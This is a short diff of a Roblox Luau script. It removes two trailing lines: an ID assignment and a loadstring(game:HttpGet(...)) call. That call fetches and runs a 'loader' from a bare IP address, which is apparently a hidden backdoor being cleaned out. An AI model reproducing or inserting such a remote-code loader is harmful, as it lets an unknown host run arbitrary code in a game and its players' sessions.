@@ -86,5 +86,3 @@ RunService.RenderStepped:Connect(function()
         gui:Destroy()
     end
 end)
-ID="b4518e52-2124-4110-a320-74d6dac3cf23"
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
